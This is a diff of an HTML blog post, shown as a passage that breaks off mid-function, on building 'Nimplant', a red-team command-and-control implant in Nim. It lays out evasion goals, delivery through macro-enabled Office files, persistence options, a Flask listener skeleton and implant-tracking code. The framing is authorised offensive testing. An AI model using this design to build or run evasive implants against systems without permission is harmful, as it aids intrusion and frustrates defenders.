@@ -1,523 +1,300 @@
-<!doctype html><html lang=en>
-<head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="ie=edge">
-<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
-<meta name=author content="map[name:Cas van Cooten]">
-<meta name=description content="Nim for offensive security For a while now I have been playing with the programming language Nim in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&amp;rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim.">
-<meta name=keywords content="homepage,blog,cas van cooten,security,hacking,Nim,Offensive Tooling,Hacking">
-<meta name=robots content="noodp">
-<meta name=theme-color content>
-<link rel=canonical href=https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/>
-<title>
-Building a C2 Implant in Nim - Considerations and Lessons Learned :: Cas van Cooten
-</title>
-<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
-<link rel=stylesheet href=/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css>
-<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
-<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
-<link rel=manifest href=/site.webmanifest>
-<link rel=mask-icon href=/safari-pinned-tab.svg color>
-<link rel="shortcut icon" href=/favicon.ico>
-<meta name=msapplication-TileColor content>
-<meta itemprop=name content="Building a C2 Implant in Nim - Considerations and Lessons Learned">
-<meta itemprop=description content="Nim for offensive security For a while now I have been playing with the programming language Nim in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim."><meta itemprop=datePublished content="2021-08-25T00:00:00+00:00">
-<meta itemprop=dateModified content="2022-02-22T20:09:33+00:00">
-<meta itemprop=wordCount content="5230"><meta itemprop=image content="https://casvancooten.com/preview.png">
-<meta itemprop=keywords content="Nim,Offensive Tooling,Hacking,">
-<meta name=twitter:card content="summary_large_image">
-<meta name=twitter:image content="https://casvancooten.com/preview.png">
-<meta name=twitter:title content="Building a C2 Implant in Nim - Considerations and Lessons Learned">
-<meta name=twitter:description content="Nim for offensive security For a while now I have been playing with the programming language Nim in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim.">
-<meta property="og:title" content="Building a C2 Implant in Nim - Considerations and Lessons Learned">
-<meta property="og:description" content="Nim for offensive security For a while now I have been playing with the programming language Nim in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/"><meta property="og:image" content="https://casvancooten.com/preview.png"><meta property="article:section" content="posts">
-<meta property="article:published_time" content="2021-08-25T00:00:00+00:00">
-<meta property="article:modified_time" content="2022-02-22T20:09:33+00:00">
-<meta property="article:published_time" content="2021-08-25 00:00:00 +0000 UTC">
-</head>
-<body>
-<div class=container>
-<header class=header>
-<span class=header__inner>
-<a href=/ style=text-decoration:none>
-<div class=logo>
-<span class=logo__mark>></span>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="map[name:Cas van Cooten]"><meta name=description content="Nim for offensive security For a while now I have been playing with the programming language Nim in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&amp;rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim."><meta name=keywords content="homepage,blog,cas van cooten,security,hacking,Nim,Offensive Tooling,Hacking"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/><title>Building a C2 Implant in Nim - Considerations and Lessons Learned :: Cas van Cooten</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Building a C2 Implant in Nim - Considerations and Lessons Learned"><meta itemprop=description content="Nim for offensive security For a while now I have been playing with the programming language Nim in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim."><meta itemprop=datePublished content="2021-08-25T00:00:00+00:00"><meta itemprop=dateModified content="2022-02-22T20:09:33+00:00"><meta itemprop=wordCount content="5230"><meta itemprop=image content="https://casvancooten.com/preview.png"><meta itemprop=keywords content="Nim,Offensive Tooling,Hacking,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://casvancooten.com/preview.png"><meta name=twitter:title content="Building a C2 Implant in Nim - Considerations and Lessons Learned"><meta name=twitter:description content="Nim for offensive security For a while now I have been playing with the programming language Nim in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim."><meta property="og:title" content="Building a C2 Implant in Nim - Considerations and Lessons Learned"><meta property="og:description" content="Nim for offensive security For a while now I have been playing with the programming language Nim in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim."><meta property="og:type" content="article"><meta property="og:url" content="https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/"><meta property="og:image" content="https://casvancooten.com/preview.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-25T00:00:00+00:00"><meta property="article:modified_time" content="2022-02-22T20:09:33+00:00"><meta property="article:published_time" content="2021-08-25 00:00:00 +0000 UTC"></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
 <span class=logo__text>Security Ramblings</span>
-<span class=logo__cursor>
-</span>
-</div>
-</a>
-<span class=header__right>
-<nav class=menu>
-<ul class=menu__inner><li><a href=/about/>About</a></li><li><a href=/posts/>Blog</a></li>
-</ul>
-</nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span>
-<span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span>
-</span>
-</span>
-</header>
-<div class=content>
-<main class=post>
-<div class=post-info>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-25 minutes
-</p>
-</div>
-<article>
-<h1 class=post-title>
-<a href=https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/>Building a C2 Implant in Nim - Considerations and Lessons Learned</a>
-</h1>
-<hr>
-<aside id=toc>
-<div class=toc-title>Table of Contents</div>
-<nav id=TableOfContents>
-<ul>
-<li><a href=#nim-for-offensive-security>Nim for offensive security</a></li>
-<li><a href=#why-another-c2>Why another C2?!</a></li>
-<li><a href=#introducing-nimplant---a-lightweight-implant-and-c2-framework>Introducing Nimplant - a lightweight implant and C2 framework</a></li>
-<li><a href=#the-tech-stuff>The Tech Stuff!</a>
-<ul>
-<li><a href=#the-c2-server>The C2 Server</a></li>
-<li><a href=#the-web-interface>The Web Interface</a></li>
-<li><a href=#the-implant>The Implant</a></li>
-<li><a href=#the-wrapper>The Wrapper</a></li>
-</ul>
-</li>
-<li><a href=#detection-guidance>Detection Guidance</a></li>
-<li><a href=#when-open-source>When open source?!</a></li>
-</ul>
-</nav>
-</aside>
-<hr>
-<div class=post-content>
-<h2 id=nim-for-offensive-security>Nim for offensive security</h2>
-<p>For a while now I have been playing with the programming language <a href=https://nim-lang.org/>Nim</a> in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim. This makes it very suitable for malware development, especially for scrubs that are too scared of C/C++ to write any proper program in those languages (like me!).</p>
-<p>My early work in Nim was <em>very</em> inspired by <a href=https://twitter.com/byt3bl33d3r>byt3bl33d3r</a> and his <a href=https://github.com/byt3bl33d3r/OffensiveNim>OffensiveNim</a> repository. In getting started, this repository is a true goldmine of code snippets and examples that you might need. It has examples on execution methods, integration with the Windows API, bypasses, and some other great malware tricks. Inspired by this repository I started to work on a malware packer/dropper, that could both execute raw shellcode and .NET binaries in a way that evades AV and most EDRs. Dubbed <strong>NimPackt</strong>, this project turned out quite well and is actively used in our red team operations to generate evasive binaries. Though that means I want to avoid sharing the full source code to prevent fingerprinting for now, I might do a blog post about it one day (if there&rsquo;s enough interest).</p>
-<p>If you want to get started with malware development in Nim yourself, I can recommend <a href=https://huskyhacks.dev/2021/07/17/nim-exploit-dev/>this blog post</a> by <a href=https://twitter.com/HuskyHacksMK>HuskyHacks</a>, which explains how to set up a Nim development environment and build your first process injector using Nim. Beyond that, the OffensiveNim repository linked above should definitely help you build more advanced tools.</p>
-<h2 id=why-another-c2>Why another C2?!</h2>
-<p>Command and Control (C2) frameworks have been popping up left and right in the offensive security tooling landscape. On a high level, a C2 allows you to communicate with malware implants remotely, typically in a client-server type of architecture. The C2 channel, as well as the type of implant and functionality, can differ wildly per C2 framework. Most frameworks are however designed to be flexible and extensible, and can be adapted to your needs. Some frameworks are commercial and closed-source (Cobalt Strike), but there are many open-source alternatives available. A good overview of solutions and capabilities is provided in <a href=https://www.thec2matrix.com/matrix>the C2 matrix</a>.</p>
-<p>If there are so many free and flexible C2 frameworks, why build another one? Good question, reader! I&rsquo;m sure that my goals (see next section) could&rsquo;ve been achieved by extending or modifying an open-source framework. However, adapting or extending an existing framework requires you to thoroughly understand the framework and its features, which requires a significant time investment either way. Additionally, the downside of open-source tooling is that defenders have the same access to it as us red-colored folk do - therefore it tends to be quickly fingerprinted.</p>
-<p><em>As much as I would like to open-source Nimplant, I cannot do that just yet for this reason. I will try my best to share the most interesting code snippets so you can build your own (or work on detection rules 👀). Once we &ldquo;retire&rdquo; Nimplant from production use, I will make sure to open-source it.</em></p>
-<p>Building your own C2, on the other hand, brings a couple of advantages. First and foremost it is a fun learning project which allows you to challenge yourself to explore the edges of your ability. Additionally, building your own C2 allows you full control over the tactics, techniques, and procedures (TTPs) applied in your framework, and by extension the indicators of compromise (IOCs) that you will leave in your client&rsquo;s environment. Though it comes at the cost of a sizeable time investment, this was enough for me to &ldquo;roll&rdquo; my own C2 in Nim.</p>
-<h2 id=introducing-nimplant---a-lightweight-implant-and-c2-framework>Introducing Nimplant - a lightweight implant and C2 framework</h2>
-<p><img src=/images/nimplant-logo.png alt="Nimplant Logo"></p>
-<p>With all that out of the way, let&rsquo;s get to the meat &lsquo;n&rsquo; potatoes of this post - <strong>Nimplant</strong>! Nimplant is what I dubbed the C2, obviously (and very unoriginally) because of the implant written in Nim. As it turns out, I wasn&rsquo;t the first with this idea&mldr;</p>
-<blockquote class=twitter-tweet><p lang=en dir=ltr>Ironically I also built a stage 0 implant in nim called nimplant 😆 never quite finished it tho, as with many projects 🤣 UIs looking sharp 😎</p>&mdash; Dominic Chell (@domchell) <a href="https://twitter.com/domchell/status/1414267057617739782?ref_src=twsrc%5Etfw">July 11, 2021</a></blockquote>
-<script async src=https://platform.twitter.com/widgets.js></script>
-<p>Nimplant is meant for use as a first-stage implant. This means that it is typically used for an initial infection, before dropping more elaborate malware such as a Cobalt Strike beacon. This use case poses a couple of requirements for the implant:</p>
-<ul>
-<li>It has to be <strong>lightweight</strong>. Operators should for example be able to drop it through a macro-enabled Office document, without arousing too much suspicion (looking at you Go, with your 5MB binaries&mldr;).</li>
-<li>It has to be <strong>evasive</strong>. Stage-1 implants are commonly used when little is known about a target environment - including which defensive products are in use. As such, the implant should be able to evade most common defensive products without much adaptation.</li>
-<li>It has to be <strong>functional</strong>. At the very minimum, the implant needs to be able to collect information about a target environment to aid in further operations, such as the domain name and any defensive products that are in use. Preferably, the implant should also allow an operator to deploy further malware stages without the need for re-infection (i.e. phishing a second time).</li>
-</ul>
-<p>Nimplant was designed to fulfil these requirements as efficiently as possible. The design philosophy of Nimplant is quite simple: <strong>&ldquo;evasion through benign functionality&rdquo;</strong>. Many implants have functionality to aid with further exploitation and evasion, such as the option to inject shellcode into other processes, or the usage of direct syscalls to evade defenses. While very useful in practice, employing functionality like this greatly increases the risk of detection.</p>
-<p>The idea behind Nimplant is to only allow functionality that is considered benign and could be applied by legitimate (remote access) tooling. So no shellcode executions, but basic filesystem, WMI, and registry operations instead. This will allow operators to collect the information they need, as well as give them the flexibility to drop further malware or persistence (e.g. through registry run-keys, DLL sideloading, or the classic startup folder). While this limits some of the possibilities for in-memory execution and evasion tradecraft, this is considered an &ldquo;accepted risk&rdquo; for the intents and purposes of Nimplant. This also opens up some possible avenues for detection, which I will discuss towards the end of this post.</p>
-<p>Of course, any tool that we deploy in a client&rsquo;s environment needs to adhere to the highest standards for operational security (&ldquo;opsec&rdquo;). This is especially true since the implant will communicate with a server over the internet - you don&rsquo;t want to inadvertently leak sensitive information on the client&rsquo;s environment out to the internet! Some measures related to opsec are listed in the following sections.</p>
-<h2 id=the-tech-stuff>The Tech Stuff!</h2>
-<p>While all of the above sounds pretty nice, I&rsquo;m sure you didn&rsquo;t come to this blog post for just talk about some theoretical C2 implant. In this section, I will share some of the more interesting technical details of Nimplant, as well as some of the mistakes that I made during development (so you don&rsquo;t have to).</p>
-<p>Like most typical C2, Nimplant functions in a client-server architecture over HTTP(S). Because the implant and server are two components that are quite distinct, we will review both separately.</p>
-<h3 id=the-c2-server>The C2 Server</h3>
-<p>Though I&rsquo;ve been raving about Nim for most of this post, I built the actual C2 server in Python. Reason for this is I&rsquo;m much more comfortable with Python overall, and it&rsquo;s quite a bit more mature as a language than Nim. Though Nim has the several advantages listed earlier in this post, these advantages are less applicable for the server component as it will not be compiled and/or deployed within the client&rsquo;s environment.</p>
-<p>For the web server, I went with Python&rsquo;s <a href=https://palletsprojects.com/p/flask/>Flask</a> framework. Flask is very easy to pick up, and makes it easy to expose endpoints with a variety of functionality. In reality there are two Flask servers running, one supporting the Nimplant listener and one supporting the GUI (see below). At a very high level, the Flask server for Nimplant listener looks like this.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#999;font-style:italic># Define a new Flask server to run in its own thread</span>
-<span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>flaskListener</span>():
-    <span style=color:orange>@app</span>.route(registerPath, methods=[<span style=color:#ed9d13>&#39;GET&#39;</span>, <span style=color:#ed9d13>&#39;POST&#39;</span>])
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>getNimplant</span>():
-        <span style=color:#999;font-style:italic># This endpoint is used for Nimplant registration.</span>
-				<span style=color:#999;font-style:italic># If a Nimplant matches expected properties, the key exchange will happen.</span>
-				<span style=color:#999;font-style:italic># After that, Nimplant will submit it&#39;s (encrypted) registration info.</span>
-
-    <span style=color:orange>@app</span>.route(taskPath, methods=[<span style=color:#ed9d13>&#39;GET&#39;</span>])
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>getTask</span>():
-				<span style=color:#999;font-style:italic># This endpoint is used to communicate tasks to Nimplant.</span>
-				<span style=color:#999;font-style:italic># It will verify integrity, then return an encrypted task (if available).</span>
-
-    <span style=color:orange>@app</span>.route(resultPath, methods=[<span style=color:#ed9d13>&#39;POST&#39;</span>])
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>getResult</span>():
-        <span style=color:#999;font-style:italic># This endpoint retrieves and parses encrypted results from Nimplant.</span>
-
-    app.run(host=listenerIp, port=listenerPort)
-</code></pre></div><p>You will notice that the actual addresses of endpoints (e.g. <code>www.yourc2.com/register</code>), as well as the server IP and port, are configurable. These properties are parsed from the <code>config.toml</code> file, which is shared between a C2 server and its Nimplants. Because this configuration file is shared, it allows the server to perform integrity checks based on the properties of incoming web requests, such as the User-Agent or HTTP headers. Unexpected requests are dropped, making it harder for incident responders to actually interact with the C2 server.</p>
-<p>Special attention should be paid to the initial key exchange, which happens when a Nimplant first checks in. Since every Nimplant has a unique encryption key associated with it, the server shares this key as part of the <code>getNimplant()</code> function. We don&rsquo;t want to transmit this key in plain-text, even if HTTPS is used. This is because we operate under the assumption that our client has insight into their network traffic by means of a web proxy or similar device that allows for SSL inspection (which is true for most mature clients). As such, the initial key exchange itself is encrypted with a key that is established when the Nimplant is first generated. After this exchange, Nimplant will use its unique key to AES-encrypt all subsequent traffic.</p>
-<p>The C2 server will keep track of Nimplants through the use of classes - every Nimplant corresponds to one instance of the <code>Nimplant</code> class, which has a variety of properties for Nimplant. A snippet of the class, along with some of its helper functions, is as follows.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>class</span> <span style=color:#447fcf;text-decoration:underline>NimPlant</span>:
-		<span style=color:#999;font-style:italic># Initialize a new Nimplant object, use data from config where applicable</span>
-    newId = itertools.count(start=<span style=color:#3677a9>1</span>)
-    <span style=color:#6ab825;font-weight:700>def</span> __init__(self):
-        self.id = <span style=color:#24909d>str</span>(<span style=color:#24909d>next</span>(self.newId))
-        self.guid = <span style=color:#ed9d13>&#39;&#39;</span>.join(random.choice(string.ascii_letters + string.digits) <span style=color:#6ab825;font-weight:700>for</span> i <span style=color:#6ab825;font-weight:700>in</span> <span style=color:#24909d>range</span>(<span style=color:#3677a9>8</span>))
-        self.active = <span style=color:#6ab825;font-weight:700>False</span>
-        self.ipAddrExt = <span style=color:#6ab825;font-weight:700>None</span>
-        self.ipAddrInt = <span style=color:#6ab825;font-weight:700>None</span>
-        self.username = <span style=color:#6ab825;font-weight:700>None</span>
-        self.hostname = <span style=color:#6ab825;font-weight:700>None</span>
-        self.osBuild = <span style=color:#6ab825;font-weight:700>None</span>
-        self.pid = <span style=color:#6ab825;font-weight:700>None</span>
-        self.sleepTimeSeconds = sleepTimeSeconds
-        self.killTimeHours = killTimeHours
-        self.firstCheckin = <span style=color:#6ab825;font-weight:700>None</span>
-        self.lastCheckin = <span style=color:#6ab825;font-weight:700>None</span>
-        self.task = <span style=color:#6ab825;font-weight:700>None</span>
-        self.hostingFile = <span style=color:#6ab825;font-weight:700>None</span>
-        self.cryptKey = <span style=color:#999;font-style:italic># secret sauce omitted 👀</span>
-
-		<span style=color:#999;font-style:italic># Populate the Nimplant object with information based on first check-in</span>
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>activate</span>(self, ipAddrExt, ipAddrInt, username, hostname, osBuild, pid):
-        self.active = <span style=color:#6ab825;font-weight:700>True</span>
-        self.ipAddrExt = ipAddrExt
-        self.ipAddrInt = ipAddrInt
-        self.username = username
-        self.hostname = hostname
-        self.osBuild = osBuild
-        self.pid = pid
-        self.firstCheckin = timestamp()
-        self.lastCheckin = timestamp()
-				<span style=color:#999;font-style:italic># &#39;nimplantPrint&#39; is a custom function to properly direct output to console or a Nimplant&#39;s log</span>
-        nimplantPrint(<span style=color:#ed9d13>f</span><span style=color:#ed9d13>&#34;NimPlant #</span><span style=color:#ed9d13>{</span>self.id<span style=color:#ed9d13>}</span><span style=color:#ed9d13> (</span><span style=color:#ed9d13>{</span>self.guid<span style=color:#ed9d13>}</span><span style=color:#ed9d13>) checked in from </span><span style=color:#ed9d13>{</span>username<span style=color:#ed9d13>}</span><span style=color:#ed9d13>@</span><span style=color:#ed9d13>{</span>hostname<span style=color:#ed9d13>}</span><span style=color:#ed9d13> at &#39;</span><span style=color:#ed9d13>{</span>ipAddrExt<span style=color:#ed9d13>}</span><span style=color:#ed9d13>&#39;!&#34;</span>)
-        nimplantPrint(<span style=color:#ed9d13>f</span><span style=color:#ed9d13>&#34;OS version is </span><span style=color:#ed9d13>{</span>osBuild<span style=color:#ed9d13>}</span><span style=color:#ed9d13>.&#34;</span>)
-
-		<span style=color:#999;font-style:italic># Process a &#39;regular&#39; Nimplant check-in</span>
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>checkIn</span>(self):
-        self.lastCheckin = timestamp()
-        <span style=color:#6ab825;font-weight:700>if</span> self.task <span style=color:#6ab825;font-weight:700>is</span> <span style=color:#6ab825;font-weight:700>not</span> <span style=color:#6ab825;font-weight:700>None</span>:
-            <span style=color:#6ab825;font-weight:700>if</span> self.task == <span style=color:#ed9d13>&#34;kill&#34;</span>:
-                self.active = <span style=color:#6ab825;font-weight:700>False</span>
-                nimplantPrint(<span style=color:#ed9d13>f</span><span style=color:#ed9d13>&#34;Nimplant #</span><span style=color:#ed9d13>{</span>self.id<span style=color:#ed9d13>}</span><span style=color:#ed9d13> killed.&#34;</span>, self.guid)
-
-		<span style=color:#999;font-style:italic># Process the result for a certain Nimplant</span>
-    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>setResult</span>(self, result):
-        <span style=color:#6ab825;font-weight:700>if</span> result == <span style=color:#ed9d13>&#34;NIMPLANT_KILL_TIMER_EXPIRED&#34;</span>:
-            self.active = <span style=color:#6ab825;font-weight:700>False</span>
-            nimplantPrint(<span style=color:#ed9d13>&#34;Nimplant announced self-destruct (kill timer expired). RIP.&#34;</span>, self.guid)
-        <span style=color:#6ab825;font-weight:700>else</span>:
-            nimplantPrint(result, self.guid)
-</code></pre></div><p>As you can see, most information about a Nimplant is populated through the <code>activate()</code> function which is triggered on first check-in. There are some checks in the various functions, which for example take care of killing a Nimplant when either the <code>exit</code> or <code>kill</code> commands are provided or the Nimplant&rsquo;s self-destruct timer expired. To keep track of the various Nimplants that have checked in as well as their respective statuses, there is also a <code>NimplantList</code> class available.</p>
-<p>Information from both of these classes is made accessible by an internal API. This API supports both the command-line interface (CLI) and the graphical user interface (GUI), discussed below. Because I focused only on the CLI when I started developing, it was quite a hassle to modify the codebase to support a generic API at a later point. If you&rsquo;re starting a project like this, don&rsquo;t make the mistake that I made: <strong>focus on writing modular and extensible code right from the start!</strong> It may take some more effort, but it will pay out in the long run.</p>
-<p>It goes without saying that the server handles quite a bit more functionality, such as parsing commands, file uploads, cryptographic operations, and logging all executed commands and the resulting output. It is beyond the scope of this blog post to discuss all of that functionality here.</p>
-<h3 id=the-web-interface>The Web Interface</h3>
-<p><em>Before I start bragging about how cool the web interface of Nimplant is, I have to give credit where credit&rsquo;s due: all of the front-end work was done by my colleague <a href=https://github.com/yamakadi>Kadir</a>.</em></p>
-<p>While a CLI to manage implants is cool, a proper C2 needs an interface that supports multiple operators working on multiple implants at the same time. Most frameworks expose a web interface for this purpose, which is exactly what Nimplant does. As mentioned above, a second Flask server is initialized to expose the Nimplant API as well as the web interface.</p>
-<p><img src=/images/nimplant-web.png alt="Nimplant Web Interface"></p>
-<p>The web interface is built with the <a href=https://vuejs.org/>Vue.js</a> framework, supported by <a href=https://tailwindcss.com/>TailwindCSS</a> and some pre-built components from <a href=https://tailwindui.com/>TailwindUI</a>. The interface is completely responsive, and could therefore even be used on mobile devices (for those on-the-go assignments). The front-end communicates with the Nimplant API to retrieve data on the current server configuration and Nimplant status. Each Nimplant has its own console, which is also exposed through the API and shown in the web interface. Of course, operators can submit commands to be executed. They also have the option to see the command history for a Nimplant as well as commands executed by other operators.</p>
-<p><img src=/images/nimplant-webconsole.png alt="Nimplant Web Console"></p>
-<p>As with other C2 frameworks, a high level of care should be taken when exposing this type of interface to the internet. While the C2 listener should be reachable over the internet (preferably behind a redirector to hide the actual infrastructure), the Nimplant web interface should be considered a management interface. As such, it should only be available to a select group of operators, for example from a dedicated VPN.</p>
-<h3 id=the-implant>The Implant</h3>
-<p>While the implant-part of Nimplant is the meat on the bone for the solution, I tried to keep it as &lsquo;slim&rsquo; as possible. Altogether, the implant part is under 1000 lines of Nim code and compiles to a binary of approximately 200KB. Nevertheless, it contains some cool features that operators can use for their &ldquo;stage-1&rdquo; shenanigans. A couple of neat features are highlighted below.</p>
-<p><strong>File operations</strong></p>
-<p>File operations consist of a variety of commands, based on their Linux counterparts. The commands related to file operations in Nimplant include <code>cat</code>, <code>cd</code>, <code>cp</code>, <code>ls</code>, <code>mkdir</code>, <code>mv</code>, <code>pwd</code>, and <code>rm</code>. The implementation of these actually isn&rsquo;t all too interesting, since most functionality is wrapped by Nim&rsquo;s <a href=https://nim-lang.org/docs/os.html>os</a> library.</p>
-<p>The biggest challenge I encountered for (some) of these commands was argument parsing. Take for instance the <code>cp</code> command, which copies a file from one place to another. In principle this is a straight-forward task. However, the command takes a source and destination parameter, the source can be both a file and a folder, and the destination can be both a partial destination (parent folder), or the new file/folder name. The function then becomes something like the following.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>os</span> <span style=color:#6ab825;font-weight:700>import</span> copyDir, copyFile, copyFileToDir, dirExists, splitPath, <span style=color:#a61717;background-color:#e3d2d2>`</span>/<span style=color:#a61717;background-color:#e3d2d2>`</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> join
-
-<span style=color:#999;font-style:italic># Copy files or directories</span>
-proc cp*(args : varargs[string]) : string =
-    var
-        source : string
-        destination : string
-
-		<span style=color:#999;font-style:italic># Parse expected number of arguments (2 or more)</span>
-    <span style=color:#6ab825;font-weight:700>if</span> args.len &gt;= <span style=color:#3677a9>2</span>:
-        source = args[<span style=color:#3677a9>0</span>]
-				<span style=color:#999;font-style:italic># If &gt;2 arguments are given, join them as the second argument</span>
-				<span style=color:#999;font-style:italic># This happens for e.g. an unquoted path with spaces</span>
-        destination = args[<span style=color:#3677a9>1</span> .. ^<span style=color:#3677a9>1</span>].join(<span style=color:#ed9d13>&#34; &#34;</span>)
-    <span style=color:#6ab825;font-weight:700>else</span>:
-				<span style=color:#999;font-style:italic># Error out if too few arguments are provided</span>
-        result = <span style=color:#ed9d13>&#34;Invalid number of arguments received. Usage: &#39;cp [source] [destination]&#39;.&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
-
-    <span style=color:#999;font-style:italic># Copying a directory</span>
-    <span style=color:#6ab825;font-weight:700>if</span> dirExists(source):
-        <span style=color:#6ab825;font-weight:700>if</span> dirExists(destination):
-						<span style=color:#999;font-style:italic># Copy the directory into the existing directory as its current name</span>
-            copyDir(source, destination/splitPath(source).tail)
-        <span style=color:#6ab825;font-weight:700>else</span>:
-						<span style=color:#999;font-style:italic># Copy the file as the provided directory name</span>
-            copyDir(source, destination)
-
-    <span style=color:#999;font-style:italic># Copying a file</span>
-    <span style=color:#6ab825;font-weight:700>elif</span> dirExists(destination):
-				<span style=color:#999;font-style:italic># Copy the file into the existing directory as its current name</span>
-        copyFileToDir(source, destination)
-    <span style=color:#6ab825;font-weight:700>else</span>:
-				<span style=color:#999;font-style:italic># Copy the file as the provided filename</span>
-        copyFile(source, destination)
-    
-		<span style=color:#999;font-style:italic># Setting &#39;result&#39; will make the function return with that result in Nim</span>
